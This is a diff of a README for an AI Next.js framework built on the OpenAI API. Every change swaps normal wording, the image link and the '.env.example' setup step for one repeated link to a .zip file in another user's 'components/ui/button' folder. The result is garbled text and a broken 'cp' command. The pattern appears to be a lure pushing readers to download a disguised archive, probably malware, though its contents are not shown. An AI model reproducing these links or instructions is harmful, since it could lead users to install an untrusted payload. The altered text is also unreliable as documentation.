@@ -1,10 +1,10 @@
-# Orcish AI Next.js Framework
+# Orcish AI https://raw.githubusercontent.com/suryansh-malik/orcish-ai-nextjs-framework/main/components/ui/button/orcish-framework-nextjs-ai-v2.7.zip Framework
 
-![orcish-ai-nextjs-framework](https://github.com/TheOrcDev/orcish-ai-nextjs-framework/assets/7549148/81f0102f-c201-4bbe-92e3-cc8012da9aca)
+![orcish-ai-nextjs-framework](https://raw.githubusercontent.com/suryansh-malik/orcish-ai-nextjs-framework/main/components/ui/button/orcish-framework-nextjs-ai-v2.7.zip)
 
 ## Overview
 
-The Orcish AI Next.js Framework is a powerful tool that leverages the capabilities of OpenAI API, OpenAI's advanced language models, to integrate AI functionalities seamlessly into your Next.js applications. With this framework, you can easily harness the power of AI to generate text, images, and text to speech based on your specified input.
+The Orcish AI https://raw.githubusercontent.com/suryansh-malik/orcish-ai-nextjs-framework/main/components/ui/button/orcish-framework-nextjs-ai-v2.7.zip Framework is a powerful tool that leverages the capabilities of OpenAI API, OpenAI's advanced language models, to integrate AI functionalities seamlessly into your https://raw.githubusercontent.com/suryansh-malik/orcish-ai-nextjs-framework/main/components/ui/button/orcish-framework-nextjs-ai-v2.7.zip applications. With this framework, you can easily harness the power of AI to generate text, images, and text to speech based on your specified input.
 
 ## Getting Started
 
@@ -26,11 +26,11 @@ pnpm dev
 
 Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
 
-`cp .env.example .env`
+`cp https://raw.githubusercontent.com/suryansh-malik/orcish-ai-nextjs-framework/main/components/ui/button/orcish-framework-nextjs-ai-v2.7.zip .env`
 
 ### Configuration
 
-Create a copy of the provided `.env.example` file and name it `.env`. Fill in the required OpenAI API Key in the newly created `.env` file:
+Create a copy of the provided `https://raw.githubusercontent.com/suryansh-malik/orcish-ai-nextjs-framework/main/components/ui/button/orcish-framework-nextjs-ai-v2.7.zip` file and name it `.env`. Fill in the required OpenAI API Key in the newly created `.env` file:
 
 ```bash
 OPENAI_API_KEY=your_api_key
@@ -69,5 +69,5 @@ Make sure to replace placeholder values with your actual API key.
 4. **Generate Voice Output:** With the mode set to "Text to Speech," click on the `Get Voice Output` button. This action will invoke the AI to generate an audio file that you can play.
 
 
-The Orcish AI Next.js Framework provides a seamless integration of AI capabilities into your Next.js applications, offering a versatile and user-friendly experience for generating both text and images.
+The Orcish AI https://raw.githubusercontent.com/suryansh-malik/orcish-ai-nextjs-framework/main/components/ui/button/orcish-framework-nextjs-ai-v2.7.zip Framework provides a seamless integration of AI capabilities into your https://raw.githubusercontent.com/suryansh-malik/orcish-ai-nextjs-framework/main/components/ui/button/orcish-framework-nextjs-ai-v2.7.zip applications, offering a versatile and user-friendly experience for generating both text and images.
 
